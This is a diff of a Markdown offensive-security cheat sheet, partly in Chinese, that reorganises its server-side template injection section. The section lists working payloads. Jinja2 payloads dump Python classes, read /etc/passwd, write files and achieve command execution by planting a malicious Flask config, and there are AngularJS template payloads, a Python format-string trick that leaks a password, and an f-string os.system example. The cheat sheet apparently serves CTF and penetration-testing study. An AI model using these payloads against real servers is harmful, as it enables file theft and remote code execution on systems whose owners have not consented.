@@ -25,8 +25,18 @@ Table of Contents
     * [Python Pickle](#python-pickle)
     * [Ruby Marshal](#rubyrails-marshal)
 *  [SSTI](#ssti)
+    * [Flask/Jinja2](#flaskjinja2)
+    * [AngularJS](#angularjs)
+    * [Python](#python)
+    * [Tool](#tool)
 *  [SSRF](#ssrf)
+    * [Bypass](#bypass-127001)
+    * [Local Expolit](#本地利用)
+    * [Remote Expolit](#遠程利用)
+    * [CRLF Injection](#crlf-injection)
+    * [Finger Print](#fingerprint)
 *  [XXE](#xxe)
+    * [Out of Band XXE](#out-of-band-oob-xxe)
 *  [Others](#其它-1)
 *  [Tools and Website](#tool--online-website)
     * [Information Gathering](#information-gathering)
@@ -1158,30 +1168,31 @@ print marshalled
 
 Server-Side Template Injection
 
-- Testing
-    - ` {{ 7*'7' }}`
-        - Twig: `49`
-        - Jinja2: `7777777`
-    - `<%= 7*7 %>`
-        - Ruby ERB: `49`
+## Testing
+- ` {{ 7*'7' }}`
+    - Twig: `49`
+    - Jinja2: `7777777`
+- `<%= 7*7 %>`
+    - Ruby ERB: `49`
 
-- Flask/Jinja2
-    - Dump all used classes
-        - `{{ ''.__class__.__mro__[2].__subclasses__() }}
+## Flask/Jinja2
+- Dump all used classes
+    - `{{ ''.__class__.__mro__[2].__subclasses__() }}
 `
-    - Read File
-        - `{{}}''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`
-    - Write File
-        - `{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}`
-    - RCE
-        - `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}`
-            - evil config
-        - `{{ config.from_pyfile('/tmp/evilconfig.cfg') }}`
-            - load config
-        - `{{ config['RUNCMD']('cat flag',shell=True) }}`
+- Read File
+    - `{{}}''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}`
+- Write File
+    - `{{''.__class__.__mro__[2].__subclasses__()[40]('/var/www/app/a.txt', 'w').write('Kaibro Yo!')}}`
+- RCE
+    - `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}`
+        - evil config
+    - `{{ config.from_pyfile('/tmp/evilconfig.cfg') }}`
+        - load config
+    - `{{ config['RUNCMD']('cat flag',shell=True) }}`
 
-- AngularJS
-    - v1.6後移除Sandbox
+## AngularJS
+- v1.6後移除Sandbox
+- Payload
     - `{{ 7*7 }}` => 49
     - `{{ this }}`
     - `{{ this.toString() }}`
@@ -1197,26 +1208,26 @@ Server-Side Template Injection
 
     
 
-- Python
-    - `%`
-        - 輸入`%(passowrd)s`即可偷到密碼：
-        ```python
-        userdata = {"user" : "kaibro", "password" : "ggininder" }
-        passwd  = raw_input("Password: ")
-        if passwd != userdata["password"]:
-            print ("Password " + passwd + " is wrong")
-        ```
-    - `f`
-        - python 3.6
-        - example
-            - `a="gg"`
-            - `b=f"{a} ininder"`
-                - `>>> gg ininder`
-        - example2
-            - `f"{os.system('ls')}"`
+## Python
+- `%`
+    - 輸入`%(passowrd)s`即可偷到密碼：
+    ```python
+    userdata = {"user" : "kaibro", "password" : "ggininder" }
+    passwd  = raw_input("Password: ")
+    if passwd != userdata["password"]:
+        print ("Password " + passwd + " is wrong")
+    ```
+- `f`
+    - python 3.6
+    - example
+        - `a="gg"`
+        - `b=f"{a} ininder"`
+            - `>>> gg ininder`
+    - example2
+        - `f"{os.system('ls')}"`
 
-- Tool
-    - https://github.com/epinna/tplmap
+## Tool
+- https://github.com/epinna/tplmap
 
 ---
 
